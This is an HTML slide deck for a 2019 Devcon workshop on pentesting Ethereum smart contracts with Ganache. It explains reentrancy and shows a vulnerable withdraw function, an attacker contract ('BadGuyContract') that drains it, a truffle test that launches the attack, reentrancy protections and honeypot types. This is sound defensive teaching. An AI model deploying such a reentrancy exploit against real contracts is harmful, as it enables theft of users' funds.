@@ -1,0 +1,968 @@
+<!doctype html>
+
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=1024" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <title>Pentesting Ethereum Contracts with Ganache // by David Murdoch and Nick Paterno // devcon 5 // 2019 // trufflesuite.com</title>
+    
+    <meta name="description" content="Pentesting Ethereum Contracts with Ganache" />
+    <meta name="author" content="David Murdoch" />
+    <meta name="author" content="Nick Paterno" />
+
+    <link rel="shortcut icon" href="favicon.png" />
+    <link rel="apple-touch-icon" href="apple-touch-icon.png" />
+
+    <link href="https://fonts.googleapis.com/css?family=Grand+Hotel|Open+Sans:300i,300,400|Oswald:200,400,700|Share+Tech+Mono|Varela+Round&display=swap" rel="stylesheet" />
+
+    <link rel="stylesheet" href="./css/highlight-truffle.css" />
+
+    <link href="css/reset.css" rel="stylesheet" />
+    <link href="css/vars.css" rel="stylesheet" />
+    <link href="css/boilerplate.css" rel="stylesheet" />
+    <link href="css/intro.css" rel="stylesheet" />
+    <link href="css/authors.css" rel="stylesheet" />
+    <link href="css/pentesting-ethereum-contracts.css" rel="stylesheet" />
+    <link href="css/testing.css" rel="stylesheet" />
+    <link href="css/truffle.css" rel="stylesheet" />
+    <link href="css/ganache.css" rel="stylesheet" />
+    <link href="css/honeypot.css" rel="stylesheet" />
+    <link href="css/disclaimer.css" rel="stylesheet" />
+    <link href="css/types-of-honeypots.css" rel="stylesheet" />
+    <script src="js/highlight.min.js"></script>
+    <script src="js/highlightjs-solidity.js"></script>
+</head>
+
+<body class="impress-not-supported">
+
+<div id="impress">
+    <div id="testing" class="step only-workshop" data-x="0" data-y="0" data-z="4920">
+        <div class="notes">
+            Click on the video. It should play audio. If it doesn’t work click the disable audio slides button.
+        </div>
+        <div class="code">
+            <div class="code-lang">A/V Test</div>
+            <div class="code-inner">
+                <pre><code style="width:60vw;height:32.3vw;padding:0;overflow:hidden;"><img style="width:100%" src="./img/16x9.png" /><div class="video" style="top:0;left:0;position:absolute;width: 110%;
+    height: 110%;
+    transform: translate(-5%, -5%);">
+                <video id="testing-video" src="./img/forever-crash.mp4" controls loop></div><div id="bars"></div></code></pre>
+            </div>
+        </div>
+        <button onclick="toggleAudioSlides(this)">Disable Audio Slides</button>
+    </div>
+
+    <div id="stand-by" class="step colorize only-workshop" data-x="0" data-y="0" data-z="2460">
+        <img class="ratio video-ratio" src="./img/16x9.png" />
+        <video src="./img/please-stand-by.mp4" loop muted autoplay>
+    </div>
+
+    <div id="jump-start" class="step" data-x="0" data-y="0" data-z="0">
+        <h2>Get a Jumpstart</h2>
+        <h4>While you wait you should set things up:</h4>
+        <ul>
+            <li>View these slides at: <a href="https://trfl.co/devcon5" target="_blank">trfl.co/devcon5</a></li>
+            <li>Install <a href="https://nodejs.org/" target="_blank">Node.js</a> v10</li>
+            <li>Download <a href="https://github.com/trufflesuite/ganache-ui/releases/tag/v2.2.1-alpha.0" target="_blank" rel="noopener">Ganache UI Alpha</a> or run <code>npm install -g <a href="https://www.npmjs.com/package/ganache-cli" rel="noopener" target="_blank">ganache-cli</a></code></li>
+            <li>Clone the workshop repo: <code>git clone <a href="https://trfl.co/honeypot-exploration" target="_blank" rel="noopener">https://github.com/trufflesuite/devcon5-honeypot-exploration</a></code></li>
+            <li>Init the workshop repo: <code>npm install</code></li>
+        </ul>
+    </div>
+
+
+    <div id="intro" class="step" data-x="0" data-y="0" data-z="-1920" data-rotate-y="45" data-transition-duration="5000">
+        <div class="notes">
+            Welcome to Pentesting Ethereum Contract with Ganache!
+            We’re about to get started here. Please come in and take a seat, get your laptops ready…
+        </div>
+        <img class="ratio" src="./img/16x9.png" />
+        <div class="contents">
+            <div class="title">
+                <h1>Pentesting<br>Ethereum<br>Contracts</h1>
+                <div class="subtext">
+                    <span class="with">with</span> <span class="ganache">Ganache</span>
+                </div>
+            </div>
+            <div class="footer">
+                <div class="group">
+                    <div class="names"><a href="https://twitter.com/atdavidmurdoch" target="_blank" title="David Murdoch on Twitter">david murdoch</a> + <a href="https://twitter.com/njpaterno" target="_blank" title="Nick Paterno on Twitter">nick paterno</a></a></div>
+                    <div class="location">devcon<span class="small"> 5  //  2019  //  </span><a href="/truffle" target="_blank" title="Truffle Suite">trufflesuite.com</a></div>
+                </div>
+                <div class="icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 190.31 214"><defs><style>.cls-1{fill:#e4a663;}.cls-2{fill:#5e464d;}.cls-3{fill:#fff;}</style></defs><title>ganache-logomark</title><g id="Layer_2" data-name="Layer 2"><g id="Layer_8" data-name="Layer 8"><path class="cls-1" d="M165.38,160.31c2.24,0,3-.52,4.06-2.33s.55-4.75.51-5.55c-.1-1.76-.69-3.72-.76-4.7-.05-.6,0-4.43.09-6,1.34-24.84,12-30.75,15.07-31.42a8.59,8.59,0,0,1,5.94.4l0-38h0l0-.54V62.09c0-5.49-3.91-12.24-8.66-15l-77.87-45C99-.69,91.19-.69,86.43,2.06L8.65,47C3.89,49.71,0,56.46,0,62v9.82s0,.11,0,.17V86.33c.45.25.91.51,1.36.79,1.5,1,3,1.55,4.51,2.6a68.43,68.43,0,0,1,12,9.28c.7.68,3.07,3.66,3.64,4.36a47.22,47.22,0,0,0,5.77,6.6,20.62,20.62,0,0,0,3.87,2.78c2.28,1.19,6.07.92,8,.07,14.82-6.42,24.12-3.2,28.41-.62,10.61,6.37,14.15,15.28,15.28,26.1a29.22,29.22,0,0,1,.14,4.22c0,2.57-.09,6.7,2.62,7.39,3.89,1,4.83-3.16,5.41-5.92,1.32-6.25,9.63-10.35,15.72-7.2,4.2,2.17,5.92,3.4,10.07,1.57,5.2-2.29,7.87-8.12,9.68-11.22A19,19,0,0,1,134,120c8.11-5.05,28.46-3.74,29.21,18.7,0,1.22,0,4.34,0,6.24,0,2.14.07,4.23-.07,6.44-.08,1.47-.35,3-.49,4.51C162.55,155.9,161.79,160.29,165.38,160.31Z"/><path class="cls-2" d="M190.28,110.75c-.56-.17-2.16-1.22-5.93-.4-3.09.67-13.73,6.58-15.07,31.42-.08,1.53-.14,5.36-.09,6,.07,1,.66,2.94.76,4.7,0,.8.62,3.7-.51,5.55s-1.82,2.34-4.06,2.33c-3.59,0-2.83-4.41-2.83-4.41.14-1.49.41-3,.49-4.51.14-2.21.07-4.3.07-6.44,0-1.9,0-5,0-6.24C162.41,116.27,142.06,115,134,120a19,19,0,0,0-7.48,7.12c-1.81,3.1-4.48,8.93-9.68,11.22-4.15,1.83-5.87.6-10.07-1.57-6.09-3.15-14.4.95-15.72,7.2-.58,2.76-1.52,6.91-5.41,5.92-2.71-.69-2.62-4.82-2.62-7.39a29.22,29.22,0,0,0-.14-4.22c-1.13-10.82-4.67-19.73-15.28-26.1-4.29-2.58-13.59-5.8-28.41.62-2,.85-5.74,1.12-8-.07A20.62,20.62,0,0,1,27.25,110a47.22,47.22,0,0,1-5.77-6.6c-.57-.7-2.94-3.68-3.64-4.36a68.43,68.43,0,0,0-12-9.28c-1.52-1-3-1.64-4.51-2.6-.45-.28-.91-.54-1.36-.79l0,65.57c0,5.5,3.9,12.25,8.66,15l77.86,45c4.76,2.76,12.55,2.76,17.31,0L181.66,167c4.76-2.75,8.65-9.5,8.65-15Z"/><path class="cls-3" d="M105,99.73c-5.39,3.11-14.2,3.11-19.58,0l-79.61-42c.9.89,80.73,47.27,80.73,47.27,4.76,2.76,12.55,2.76,17.31,0,0,0,79.74-46.24,80.63-47.13Z"/><path class="cls-3" d="M85.32,8.08C90.71,5,99.52,5,104.9,8.09l9.65,4c-.9-.89-10.78-7.29-10.78-7.29-4.75-2.75-12.54-2.76-17.3,0,0,0-15.77,9.27-16.67,10.15Z"/></g></g></svg>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="step" id="authors" data-x="-328" data-y="603" data-z="-2134" data-rotate-x="80" data-rotate-y="2" data-rotate-z="-36">
+        <div class="notes">
+        My name is David Murdoch. I’m the team lead for Ganache at Truffle.
+        </div>
+        <div id="authors-container">
+            <div class="card-inner">
+                <div class="truffle-title">
+                    <img src="./img/truffle-logo-h-dark.svg" alt="truffle">
+                </div><div class="author-title">
+                    <span>Ganache Lead</span>
+                </div>
+                <div class="image">
+                    <img src="./img/david-truffle-bg.svg">
+                </div>
+                <div class="footer">
+                    <div class="name"><span>David Murdoch</span></div>
+                    <a class="social" href="https://twitter.com/atdavidmurdoch" target="_blank" title="David Murdoch on Twitter">@atdavidmurdoch</a>
+                </div>
+            </div>
+
+            <div class="card-inner substep">
+                <div class="truffle-title">
+                    <img src="./img/truffle-logo-h-dark.svg" alt="truffle">
+                </div><div class="author-title">
+                    <span>Blockchain Eng.</span>
+                </div>
+                <div class="image">
+                    <img src="./img/nick-truffle-bg.svg">
+                </div>
+                <div class="footer">
+                    <div class="name"><span>Nick Paterno</span></div>
+                    <a class="social" href="https://twitter.com/njpaterno" target="_blank" title="Nick Paterno on Twitter">@njpaterno</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    
+    <div id="truffle" class="step" data-x="272" data-y="1134" data-z="-2399" data-rotate-x="0" data-rotate-y="-58" data-rotate-z="-71">
+        <h2>Who is Truffle?</h2>
+        <h4>Truffle is a company whose goal is to build tools to get developers from idea to dapp as comfortably as possible.</h4>
+        <p>&nbsp;</p>
+        <ul>
+            <li><img src="./img/truffle-logomark.svg"><span class="text-truffle">TRUFFLE</span><br><span>dev environment, testing framework, and asset pipeline for blockchains</span></spana></li>           
+            <li><img src="./img/drizzle-logomark.svg"><span class="text-drizzle">dri<span>z</span><span>z</span>le</span><br><span>front-end library for dapps</span></li>
+            <li><img src="./img/ganache-logomark.svg"><span class="text-ganache">Ganache</span><br><span>one-click blockchain</span></li>
+        </ul>
+    </div>
+
+    <div id="ganache" class="step" data-x="927" data-y="294" data-z="-2389" data-rotate-x="39" data-rotate-y="-129" data-rotate-z="-58" data-rotate-order="zxy">
+        <h2>What is Ganache?</h2>
+        <h4>A personal blockchain for Ethereum development</h4>
+        <center>
+            <ul style="list-style:none">
+                <li>Ganache UI<span class="text-deemphasized">: graphical user interface</span></li>
+                <li>ganache-cli<span class="text-deemphasized">: command line tool</span></li>
+                <li>ganache-core<span class="text-deemphasized">: Node.js integration tool</span></li>
+            </ul>
+        </center>
+    </div>
+
+    <div id="ganache-ui" class="step" data-x="386" data-y="-1566" data-z="-629" data-rotate-x="-30" data-rotate-y="-180" data-rotate-z="-60" data-rotate-order="zyx">
+        <h2>Ganache UI</h2>
+        <h4>One-Click Blockchain</h4>
+        <div class="ganache-ui">
+            <iframe src="./ganache-ui-1.html"></iframe>
+        </div>
+    </div>
+    
+    <div id="ganache-ui-2" class="step" data-x="-138" data-y="-1871" data-z="-9" data-rotate-x="49" data-rotate-y="-180" data-rotate-z="-60" data-rotate-order="zyx">
+        <h2>Ganache UI</h2>
+        <h4>Truffle Project Integration</h4>
+        <div class="ganache-ui">
+            <iframe src="./ganache-ui-2.html"></iframe>
+        </div>
+    </div>
+
+    
+    <div id="forking" class="step" data-x="2" data-y="-1781" data-z="389" data-rotate-x="129" data-rotate-y="-180" data-rotate-z="-60" data-rotate-order="zyx">
+        <h2>Ganache Forking</h2>
+        <h4>Easy Mainnet testing without the cost</h4>
+        <br>
+        <br>
+        <div>
+            <center>
+                <span>No sync needed</span>&nbsp;&nbsp;&bull;&nbsp;&nbsp;
+                <span>No fees required</span>&nbsp;&nbsp;&bull;&nbsp;&nbsp;
+                <span>No risk of losing funds</span>
+            </center>
+        </div>
+        </ul>
+    </div>
+
+    
+    <div id="forking-2" class="step" data-x="951" data-y="-1231" data-z="29" data-rotate-x="202" data-rotate-y="-180" data-rotate-z="-60" data-rotate-order="zyx">
+        <h2>Ganache Forking</h2>
+        <h4>Now in Ganache UI (alpha)</h4>
+        <div class="ganache-ui">
+            <iframe id="ganache-ui-forking" src="./ganache-ui-3.html"></iframe>
+        </div>
+    </div>
+
+    
+    <div id="security" class="step" data-x="1503" data-y="-931" data-z="-1291" data-rotate-x="218" data-rotate-y="-180" data-rotate-z="-60" data-rotate-order="zyx">
+        <h2>Security</h2>
+        <h4>Ethereum development is High-Risk</h4>
+        <ul style="font-size:1.25em; margin-top:1.5em;">
+            <li>Bytecode is public</li>
+            <li>Contracts are public</li>
+            <li>Hackers are private and anonymous</li>
+            <li>If you mess up, you, or your users, lose big with zero recourse</li>
+        </ul>
+    </div>
+
+    <div id="concepts" class="step" data-x="1003" data-y="-831" data-z="-1191" data-rotate-x="218" data-rotate-y="-180" data-rotate-z="-60" data-rotate-order="zyx">
+        <h2>Key Concepts</h2>
+        <h4>A few things we need to know before we get to work</h4>
+        <br>
+        <br>
+        <div>
+            <center style="font-size:1.5em;">
+                <span>Gas</span>&nbsp;&nbsp;&bull;&nbsp;&nbsp;
+                <span>Fallback Functions</span>&nbsp;&nbsp;&bull;&nbsp;&nbsp;
+                <span>Reentrancy</span>
+            </center>
+        </div>
+    </div>
+
+    <div id="gas" class="step" data-x="503" data-y="-731" data-z="-1091" data-rotate-x="218" data-rotate-y="-180" data-rotate-z="-60" data-rotate-order="zyx">
+        <h2>Gas</h2>
+        <h4>To transact on Ethereum you must pay a fee; this fee is paid in “gas”.</h4>
+        <p>Gas is paid for in Ether.</p>
+        <p>Operations on Ethereum, i.e., storing/retrieving data, transferring funds, math(s) operations, looping, etc., require some amount of gas.</p>
+        <p>Generally, if a transaction attempts to use more gas than it is given the transaction fails and no state changes are persisted.</p>
+    </div>
+
+    <div id="fallback-function" class="step" data-x="0" data-y="-631" data-z="-991" data-rotate-x="218" data-rotate-y="-180" data-rotate-z="-60" data-rotate-order="zyx">
+        <h2>Fallback Functions</h2>
+        <h4>can execute operations as long as there is enough gas forwarded to it</h4>
+        <p>A fallback function <em>must</em> be <span class="hljs-title">external</span> and is unnamed. It is called when:</p>
+        <ul>
+            <li>a contract’s address is sent Ether, or</li>
+            <li>a non-existent contract function is called.</li>
+        </ul>
+        <div class="code">
+            <div class="code-lang">solidity</div>
+            <div class="code-inner">
+                <pre><code class="solidity">function() external payable {
+ // Hello, I’m a payable fallback function.
+ // I’m invoked when Ether is sent to my contract’s address
+ // or when a method on my contract is called that doesn’t exist.
+}</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <div id="reentrancy" class="step" data-x="-500" data-y="-531" data-z="-891" data-rotate-x="218" data-rotate-y="-180" data-rotate-z="-60" data-rotate-order="zyx">
+        <h2>Reentrancy Vulnerability</h2>
+        <h4>When a contract permits unintended re-invocation of any its methods after calling an external contract during a single transaction.</h4>
+
+        <center><p><strong style="font-size:1.2em; line-height:1.7;">Smart Contract Reentrancy allows for multiple invocations of a contract’s methods during a single transaction, usually caused by forwarding excess gas to a malicious contract’s fallback function without proper reentrancy protection.</strong></p></center>
+    </div>
+
+    <div id="example-vulnerability" class="step slide" data-x="-1000" data-y="-431" data-z="-791" data-rotate-x="218" data-rotate-y="-180" data-rotate-z="-60" data-rotate-order="zyx">
+        <h2>Reentrant Vulnerability</h2>
+        <div class="code">
+            <div class="code-lang">solidity</div>
+            <div class="code-inner">
+                <pre><code class="solidity">function withdraw() external {
+  // get caller’s balance
+  uint256 amount = balances[msg.sender];
+
+  // send the amount to the caller
+  require(msg.sender.call.value(amount)()); <span class="substep" style="color:red;">👈 reentrant vulnerability</span>
+
+  // zero-out the caller’s balance
+  balances[msg.sender] = 0;
+}</code></pre>
+            </div>
+        </div>
+        <p><center>The <code class="hljs-built_in">sender</code> is able to call <code class="hljs-title">withdraw</code> again before the balance is zeroed out.</center></p>
+    </div>
+
+    <div id="disclaimer" class="step" data-x="0" data-y="" data-z="0" data-rotate="0" data-rotate-x="0" data-rotate-y="0">
+        <h2>Disclaimer</h2>
+        <h4>Just because you can, doesn’t mean you should.</h4>
+        <center>
+            <p>The intent of this workshop is to teach you how to protect your contracts against bad actors.</p>
+            <p>There is a difference between <em>permissioned</em> pentesting and white-hat (or black-hat) “hacking”.</p>
+            <p>Don’t steal. Stay legal. Be nice to people.</p>
+        </center>
+        <div class="substep video audio-slide">
+            <div class="code">
+                <div class="code-inner">
+                    <pre><code><video src="./img/malcolm.mp4"></video></code></pre>
+                </div>
+            </div>
+            <br/>
+            <h4>and Listen to Dr. Ian Malcolm</h4>
+        </div>
+    </div>
+
+    <div id="example-exploit" class="step slide" data-x="1000" data-y="500" data-z="-500" data-rotate="0" data-rotate-x="0" data-rotate-y="45">
+        <h2>Reentrant Exploit</h2>
+        <center><p>The attacker uses a <code class="hljs-comment">fallback function</code> to recursively call the target’s <code class="hljs-title">withdraw</code> function.</p></center>
+        <div class="code">
+            <div class="code-lang">solidity</div>
+            <div class="code-inner">
+                <pre><code class="solidity">import "./ClonedInterface.sol"; // not required, improves readability
+
+contract BadGuyContract {
+  <span class="hljs-keyword">ClonedInterface</span> victim;
+  constructor(address payable target) public payable {
+    victim = ClonedInterface(target);
+    victim.deposit(msg.value); <span class="substep" style="color:red">👈 initialize requirements</span>
+  }
+
+  function beBad() {
+    victim.withdraw(); <span class="substep" style="color:red">👈 c​all vulerable method</span>
+  }
+
+  function() external payable { // fallback
+    if (gasleft() &lt; <em>AMOUNT_NEEDED</em>) { return; }
+    victim.withdraw();
+  }
+}</code></pre>
+            </div>
+        </div>
+    </div>
+    <!-- ’‛ -->
+    <div id="example-exploit-2" class="step slide" data-transition-duration="0" data-x="1000" data-y="500" data-z="-500" data-rotate="0" data-rotate-x="0" data-rotate-y="45">
+        <h2>Reentrant Exploit</h2>
+        <center><p>The attacker uses a <code class="hljs-comment">fallback function</code> to recursively call the target’s <code class="hljs-title">withdraw</code> function.</p></center>
+        <div class="code" style="position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -75%);
+    z-index: 9;">
+            <div class="code-inner">
+                <pre><code class="solidity">function withdraw() external {
+  // get caller’s balance
+  uint256 amount = balances[msg.sender]; <span style="color:red">👈 check amount</span>
+
+  // send the amount to the caller
+  require(msg.sender.call.value(amount)()); <span class="substep" style="color:red;">👈 send amount</span>
+
+  // zero-out the caller’s balance
+  balances[msg.sender] = 0;
+}</code></pre>
+            </div>
+        </div>
+        <div class="code">
+            <div class="code-lang">solidity</div>
+            <div class="code-inner">
+                <pre><code class="solidity">import "./ClonedInterface.sol"; // not required, improves readability
+
+contract BadGuyContract {
+  <span class="hljs-keyword">ClonedInterface</span> victim;
+  constructor(address payable target) public payable {
+    victim = ClonedInterface(target);
+    victim.deposit(msg.value);
+  }
+
+  function beBad() {
+    victim.withdraw(); <span style="color:red">👈 c​all vulerable method</span>
+  }
+
+  function() external payable { // fallback
+    if (gasleft() &lt; <em>AMOUNT_NEEDED</em>) { return; }
+    victim.withdraw();
+  }
+}</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <div id="example-exploit-3" class="step slide" data-transition-duration="0" data-x="1000" data-y="500" data-z="-500" data-rotate="0" data-rotate-x="0" data-rotate-y="45">
+        <h2>Reentrant Exploit</h2>
+        <center><p>The attacker uses a <code class="hljs-comment">fallback function</code> to recursively call the target’s <code class="hljs-title">withdraw</code> function.</p></center>
+        <div class="code">
+            <div class="code-lang">solidity</div>
+            <div class="code-inner">
+                <pre><code class="solidity">import "./ClonedInterface.sol"; // not required, improves readability
+
+contract BadGuyContract {
+  <span class="hljs-keyword">ClonedInterface</span> victim;
+  constructor(address payable target) public payable {
+    victim = ClonedInterface(target);
+    victim.deposit(msg.value);
+  }
+
+  function beBad() {
+    victim.withdraw();
+  }
+
+  function() external payable { // fallback
+    if (gasleft() &lt; <em>AMOUNT_NEEDED</em>) { return; }
+    victim.withdraw(); <span style="color:red">👈 reenter c​ontract</span>
+  }
+}</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <div id="example-exploit-4" class="step slide" data-transition-duration="0" data-x="1000" data-y="500" data-z="-500" data-rotate="0" data-rotate-x="0" data-rotate-y="45">
+        <h2>Reentrant Exploit</h2>
+        <center><p>The attacker uses a <code class="hljs-comment">fallback function</code> to recursively call the target’s <code class="hljs-title">withdraw</code> function.</p></center>
+        <div class="code" style="position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -75%);
+    z-index: 9;">
+            <div class="code-inner">
+                <pre><code class="solidity">function withdraw() external {
+  // get caller’s balance
+  uint256 amount = balances[msg.sender]; <span style="color:red">👈 check amount</span>
+
+  // send the amount to the caller
+  require(msg.sender.call.value(amount)()); <span class="substep" style="color:red;">👈 send amount</span>
+
+  // zero-out the caller’s balance
+  balances[msg.sender] = 0;
+}</code></pre>
+            </div>
+        </div>
+        <div class="code">
+            <div class="code-lang">solidity</div>
+            <div class="code-inner">
+                <pre><code class="solidity">import "./ClonedInterface.sol"; // not required, improves readability
+
+contract BadGuyContract {
+  <span class="hljs-keyword">ClonedInterface</span> victim;
+  constructor(address payable target) public payable {
+    victim = ClonedInterface(target);
+    victim.deposit(msg.value);
+  }
+
+  function beBad() {
+    victim.withdraw();
+  }
+
+  function() external payable { // fallback
+    if (gasleft() &lt; <em>AMOUNT_NEEDED</em>) { return; }
+    victim.withdraw(); <span style="color:red">👈 reenter c​ontract</span>
+  }
+}</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <div id="example-exploit-5" class="step slide" data-transition-duration="0" data-x="1000" data-y="500" data-z="-500" data-rotate="0" data-rotate-x="0" data-rotate-y="45">
+        <h2>Reentrant Exploit</h2>
+        <center><p>The attacker uses a <code class="hljs-comment">fallback function</code> to recursively call the target’s <code class="hljs-title">withdraw</code> function.</p></center>
+        <div class="code">
+            <div class="code-lang">solidity</div>
+            <div class="code-inner">
+                <pre><code class="solidity">import "./ClonedInterface.sol"; // not required, improves readability
+
+contract BadGuyContract {
+  <span class="hljs-keyword">ClonedInterface</span> victim;
+  constructor(address payable target) public payable {
+    victim = ClonedInterface(target);
+    victim.deposit(msg.value);
+  }
+
+  function beBad() {
+    victim.withdraw();
+  }
+
+  function() external payable { // fallback
+    if (gasleft() &lt; <em>AMOUNT_NEEDED</em>) { return; }
+    victim.withdraw(); <span style="color:red">👈 reenter c​ontract, again<span class="substep">, <em>ad infinitum…</em></span></span>
+  }
+}</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <div id="example-truffle-test" class="step slide" data-x="1500" data-y="1000" data-z="-1000" data-rotate="0" data-rotate-x="0" data-rotate-y="90">
+        <h2>Reentrant Execution</h2>
+        <center><p>The attacker deploys their <code class="hljs-title">BadGuyContract</code> contract and executes the attack against the <code>target</code> contract.</p></center>
+        <center><code style="padding:.5vw; background:var(--dark-chocolate)"><span class="hljs-string">bad@guy</span>:<span class="hljs-comment">~$</span> truffle test</code></center>
+        <div class="code">
+            <div class="code-lang">javascript (with truffle)</div>
+            <div class="code-inner">
+                <pre><code class="javascript">const BadGuyContract = artifacts.require("./BadGuyContract.sol");
+
+contract("BadGuyContract", accounts => {
+  it("exploits the target contract", async () => {
+    const target = "0x..."; // target’s address
+
+    <span class="substep">// deploy the BadGuyContract, seeding it with 1 Ether
+    const value = web3.utils.toWei(1);
+    const contract = await BadGuyContract.deploy(target, {value});</span>
+
+    <span class="substep">// execute the attack, stealing Ether from the target
+    await contract.beBad();</span>
+  });
+});<div id="bad-guy" class="substep video audio-slide">
+<video src="./img/bad-guy.mp4">
+</div></code></pre>
+            </div>
+        </div>
+    </div>
+
+    <div id="questions-1" class="step slide" data-x="0" data-y="0" data-z="0" data-rotate="0" data-rotate-x="0" data-rotate-y="0">
+        <h2>What we’ve covered so far</h2>
+        <div style="display:flex">
+            <ul>
+                <li>Truffle</li>
+                <li>Ganache</li>
+                <li>Ganache Forking</li>
+                <li>Gas</li>
+            </ul>
+            <ul>
+                <li>Fallback Functions</li>
+                <li>Reentrancy</li>
+                <li>Exploit</li>
+                <li><code>truffle test</code></li>
+            </ul>
+        </div>
+        <h1 class="substep">Questions?</h1>
+    </div>
+
+    <div id="dao" class="step" data-x="1000" data-y="500" data-z="-500" data-rotate="0" data-rotate-x="0" data-rotate-y="45">
+        <h2>DAO Hack</h2>
+        <h4>The most infamous Ethereum reentrancy attack</h4>
+        <p>&nbsp;</p>
+        <div class="code">
+            <div class="code-lang">solidity</div>
+            <div class="code-inner">
+                <pre><code class="solidity">// simplified version of the DAO vulerability
+function payOut(address _recipient, uint _amount) returns (bool) {
+  // send `_amount` to `_recipient`, forwarding all remaining gas
+  if (_recipient.call.value(_amount)()) { <span class="substep" style="color:red">👈 reentrancy vulerability</span>
+    // <em>then,</em> if successful, mark `_recipient` as paid
+    PayOut(_recipient, _amount);
+    return true;
+  } else {
+    return false;
+  }
+}</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <div id="reentrancy-prevention" class="step" data-x="1500" data-y="1000" data-z="-1000" data-rotate="0" data-rotate-x="0" data-rotate-y="90">
+        <h2>Reentrancy Protection</h2>
+        <div class="code">
+            <div class="code-lang">solidity</div>
+            <div class="code-inner">
+                <pre><code class="solidity"><span class="substep">// 1) Checks-Effects-Interactions pattern
+function withdraw() external {
+  require(balances[msg.sender] > 0); <span class="substep" style="color:red">👈 check</span>
+  uint256 amount = balances[msg.sender];
+  // set balance to 0 <em>before</em> calling external contract
+  balances[msg.sender] = 0; <span class="substep" style="color:red">👈 effect</span>
+  require(msg.sender.call.value(amount)()); <span class="substep" style="color:red">👈 interaction</span>
+}</span>
+<span class="substep">
+// 2) use a mutex or OpenZeppelin’s ReentrancyGuard
+function withdraw() external {
+  require(!lock, "Reentrancy not allowed");
+  lock = true; <span class="substep" style="color:red">👈 lock</span>
+  /* do the things */  <span class="substep" style="color:red">👈 do things</span>
+  lock = false; <span class="substep" style="color:red">👈 unlock</span>
+}</span></code></pre>
+            </div>
+        </div>
+    </div>
+
+    <div id="an-anti-pattern" class="step" data-x="1500" data-y="2000" data-z="-1000" data-rotate-x="-90" data-rotate-y="150" data-rotate-z="90">
+        <h2>An Anti Pattern</h2>
+        <h4>Using <code class="hljs-built_in">address.send</code> or <code class="hljs-built_in">address.transfer</code> to protect against reentrancy is an anti-pattern</h4>
+        <p><code class="hljs-built_in">address.call</code> forwards all remaining gas by default, while <code class="hljs-built_in">address.transfer</code> and <code class="hljs-built_in">address.send</code> only forward 2300* gas.</p>
+        <p>2300 gas is not enough gas to allow for reentrancy, so it appears that we are safe!</p>
+        <p>However, this may not be true in future hardforks! You should not rely on gas costs to protect against reentrancy!</strong>
+        <p><small>* ish, it’s complicated</small></p>
+    </div>
+
+    <div id="constantinople" class="step" data-x="1920" data-y="-1920" data-z="1920" data-rotate="0" data-rotate-x="-60" data-rotate-y="-60">
+        <h2>Constantinople</h2>
+        <h4>Reduced storage costs allowed for reentrancy where it wasn’t possible before</h4>
+        <p>An EIP included in Constantinople would have lowered the minimum cost of storage from 5000 gas to 200 gas.</p>
+        <p>This could have introduced vulerabilities into contracts that rely on the default gas stipend of <code class="hljs-built_in">transfer</code>/<code class="hljs-built_in">send</code> for protection.</p>
+        <p>The EIP was removed in Petersburg and was never live on Mainnet*.</p>
+        <p><small>* ish, it’s also complicated</small></p>
+    </div>
+
+    <div id="istanbul" class="step" data-x="1920" data-y="-1920" data-z="1920" data-rotate="0" data-rotate-x="-60" data-rotate-y="-60">
+        <h2>Istanbul</h2>
+        <h4>Istanbul’s increased gas costs may break some contracts</h4>
+        <p><center>Some contracts are coded to rely on gas costs remaining the same and will now run out of gas.</center></p>
+        <p><center>You probably shouldn’t use <code class="hljs-built_in">address.transfer</code> or <code class="hljs-built_in">address.send</code>.</center></p>
+        <br/>
+        <div class="code">
+            <div class="code-lang">solidity</div>
+            <div class="code-inner">
+                <pre><code class="solidity">// previously worked; breaks under Istanbul!
+function() public payable {
+  require(total() + msg.value &lt;= limit);
+}
+</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <div id="do-not-rely-on-gas-costs" class="step" data-x="1920" data-y="-1920" data-z="1920" data-rotate="0" data-rotate-x="-60" data-rotate-y="-60">
+        <h2>Do not rely on gas costs to protect against reentrancy!</h2>
+    </div>
+
+    <div id="the-honeypot" class="step slide" data-x="1920" data-y="5760" data-z="1920" data-rotate="0" data-rotate-x="-120" data-rotate-y="-120">
+        <div class="notes">
+            testing
+        </div>
+        <div>
+            <h2>The Honeypot</h2>
+            <h4>Hack the Hacker</h4>
+            <p>What if we could design a contract that would not only stop the bad guy, but make the bad guy themselves the victim!</p>
+            <p>That is what an Ethereum honeypot contract is*: a contract that is cleverly disguised to <em>look</em> vulnerabile, but isn’t.</p>
+            <p><small><small>* in infosec this is a “mousetrap”, but in Ethereum we’ve been calling it a honeypot… so a honeypot it is.</small></small></p>
+            <img class="substep" src="./img/pooh.png">
+        </div>
+    </div>
+
+    <div id="types-of-honeypots" class="step slide" data-x="1920" data-y="5760" data-z="1920" data-rotate="0" data-rotate-x="-120" data-rotate-y="-120">
+        <div class="notes">
+            testing
+        </div>
+        <div>
+            <h2>Types of Honeypots</h2>
+            <h4>There are many ways to craft a honeypot; here are some tricky ones:</h4>
+            <div class="types-table">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Zone</th>
+                        <th>Technique</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Ethereum Virtual Machine</td>
+                        <td>Balance Disorder</td>
+                    </tr>
+                    <tr>
+                        <td rowspan="4">Solidity Compiler</td>
+                        <td>Inheritance Disorder</td>
+                    </tr>
+                    <tr>
+                        <td>Skip Empty String Literal</td>
+                    </tr>
+                    <tr>
+                        <td>Type Deduction Overflow</td>
+                    </tr>
+                    <tr>
+                        <td>Uninitialised Struct</td>
+                    </tr>
+                    <tr>
+                        <td rowspan="3">Etherscan Blockchain Explorer</td>
+                        <td>Hidden State Update</td>
+                    <tr>
+                        <td>Hidden Transfer</td>
+                    </tr>
+                    <tr>
+                        <td>Straw Man Contract</td>
